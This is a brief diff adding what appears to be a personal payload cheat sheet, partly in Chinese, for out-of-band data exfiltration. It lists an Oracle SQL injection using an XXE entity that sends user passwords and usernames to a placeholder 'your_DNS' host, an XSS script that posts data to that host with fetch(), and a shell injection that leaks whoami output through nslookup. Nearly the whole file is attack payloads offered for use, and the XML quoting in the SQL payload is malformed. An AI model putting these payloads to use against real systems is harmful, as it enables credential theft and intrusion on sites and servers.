@@ -1,0 +1,18 @@
+1. SQL:
+编码: + -> space    %3f -> ?    %3d -> =    %25 -> % 
+    %3a -> :    %3b -> ;
+UNION SELECT EXTRACTVALUE(
+    xmltype(<?xml version="1.0" charset="UTF-8"?>
+            <!DOCTYPE root[
+                        <!ENTITY % remote SYSTEM "https://'||+SELECT password||"---"||username FROM users ||'your_DNS">
+                        remote;
+                        ]
+            >
+    )
+)
+
+2. XSS:
+<script>fetch("https://your_DNS",{method:"GET/POST",mode:"no-cors",body:攻击内容})</script>
+
+3. shell:
+|| nslookup "test123".`whoami`.your_DNS ||
